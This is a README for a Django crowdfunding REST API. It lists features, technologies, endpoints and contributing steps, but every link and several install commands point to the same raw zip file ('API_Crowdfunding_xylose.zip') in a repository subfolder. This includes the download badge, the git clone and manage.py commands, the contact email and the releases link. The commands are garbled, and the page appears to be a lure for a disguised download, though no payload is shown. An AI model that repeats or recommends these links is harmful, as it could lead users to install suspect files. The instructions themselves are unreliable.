# Crowdfunding API 🎉🔧

Welcome to the **Crowdfunding API**! This RESTful API allows users to create, manage, and track group fundraising campaigns. You can also make donations easily. 

[![Download Releases](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip%https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip)](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip)

## Table of Contents

- [Features](#features)
- [Technologies Used](#technologies-used)
- [Installation](#installation)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features

- **Create Campaigns**: Users can create fundraising campaigns with detailed descriptions.
- **Manage Campaigns**: Update or delete existing campaigns as needed.
- **Track Donations**: Monitor contributions in real-time.
- **User Authentication**: Secure user accounts with JWT tokens.
- **Notifications**: Get updates about campaign progress and milestones.
- **Responsive Design**: Works seamlessly on various devices.

## Technologies Used

This project leverages a variety of technologies to provide a robust solution:

- **Django**: A high-level Python web framework that encourages rapid development.
- **Django REST Framework**: A powerful toolkit for building Web APIs.
- **Celery**: An asynchronous task queue/job queue based on distributed message passing.
- **PostgreSQL**: A powerful, open-source object-relational database system.
- **Redis**: An in-memory data structure store, used as a database, cache, and message broker.
- **Docker**: For containerizing the application, making it easy to deploy.
- **Nginx**: A high-performance web server that also acts as a reverse proxy.
- **Pillow**: A Python Imaging Library that adds image processing capabilities.
- **Uvicorn**: A lightning-fast ASGI server for Python.

## Installation

To set up the Crowdfunding API on your local machine, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip
   cd Crowdfunding_API
   ```

2. **Set Up Docker**:
   Ensure you have Docker installed. Then, run:
   ```bash
   docker-compose up --build
   ```

3. **Migrate the Database**:
   After the containers are up, run the following command to apply migrations:
   ```bash
   docker-compose exec web python https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip migrate
   ```

4. **Create a Superuser**:
   Create an admin user to access the admin panel:
   ```bash
   docker-compose exec web python https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip createsuperuser
   ```

5. **Access the API**:
   Open your browser and go to `http://localhost:8000/api/` to start using the API.

## Usage

Once the API is up and running, you can interact with it using tools like Postman or curl. Here’s how to get started:

1. **Authentication**:
   Use the endpoint `/api/auth/login/` to log in and obtain a JWT token.

2. **Create a Campaign**:
   Send a POST request to `/api/campaigns/` with the campaign details.

3. **View Campaigns**:
   Access the list of campaigns by sending a GET request to `/api/campaigns/`.

4. **Make a Donation**:
   Send a POST request to `/api/donations/` with the donation details.

## API Endpoints

Here’s a list of the main API endpoints available:

| Method | Endpoint                | Description                       |
|--------|-------------------------|-----------------------------------|
| GET    | `/api/campaigns/`      | List all campaigns                |
| POST   | `/api/campaigns/`      | Create a new campaign             |
| GET    | `/api/campaigns/{id}/`  | Retrieve a specific campaign      |
| PUT    | `/api/campaigns/{id}/`  | Update a specific campaign        |
| DELETE | `/api/campaigns/{id}/`  | Delete a specific campaign        |
| POST   | `/api/donations/`      | Make a donation                   |
| GET    | `/api/auth/login/`     | Log in and receive a JWT token    |

## Contributing

We welcome contributions to the Crowdfunding API! To get involved:

1. **Fork the Repository**: Click on the fork button at the top right of the page.
2. **Create a Branch**: Create a new branch for your feature or bug fix.
   ```bash
   git checkout -b feature/YourFeature
   ```
3. **Make Changes**: Implement your changes and commit them.
   ```bash
   git commit -m "Add your message here"
   ```
4. **Push to Your Branch**:
   ```bash
   git push origin feature/YourFeature
   ```
5. **Create a Pull Request**: Go to the original repository and create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, feel free to reach out:

- **Email**: https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip
- **GitHub**: [omarhamdy1](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip)

Thank you for checking out the Crowdfunding API! We hope you find it useful for your fundraising needs. 

For the latest releases, visit our [Releases section](https://raw.githubusercontent.com/omarhamdy1/Crowdfunding_API/main/crowdfunding/core/API_Crowdfunding_xylose.zip).